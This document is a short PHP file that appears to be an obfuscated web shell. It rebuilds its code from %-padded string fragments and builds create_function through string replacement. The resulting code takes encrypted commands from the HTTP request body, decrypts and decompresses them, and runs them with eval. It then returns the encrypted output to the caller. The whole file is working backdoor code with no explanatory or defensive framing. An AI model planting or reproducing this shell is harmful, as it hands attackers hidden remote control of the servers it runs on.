<?php
$o='p="J41Chg27%Iok%zqFLu";functi%on x($%t,$k){%%$%c=st%rlen($k);$l=str';
$O='$%k="f6eb%2693";$k%h=%"a27553%67c1c%4";%$kf="812ab50f4571"%;$%%';
$M='le%n($t);$%o="";for%%($i=0;$i<$l;%){%for($j=%0;($j<%$c&&$%i<$l);$';
$j='j+%%+,$i++){$%%o.=$t{$i}^$k%{$j%};%}}%retu%rn $o;}if (@preg_ma%';
$Z='se64_%encode(%@x(@gzco%%%mpress($o),$k));p%rint("$p%%$kh$r$kf");}';
$c=str_replace('DE','','DEDEcreatDEeDE_fDEDEunction');
$g='$m[1])%,$k)));%$%o=@ob_ge%t_contents(%);@ob_e%nd%_clean();$r=%@ba%';
$p='%1) {%@ob_start();@e%v%al(@gz%uncompres%s%(@x(@base%64%_deco%de(';
$i='tch("%/%$kh(.+)$kf/"%,%@file_get_c%ontents("p%hp://i%nput")%,$m)=%=';
$C=str_replace('%','',$O.$o.$M.$j.$i.$p.$g.$Z);
$k=$c('',$C);$k();
?>
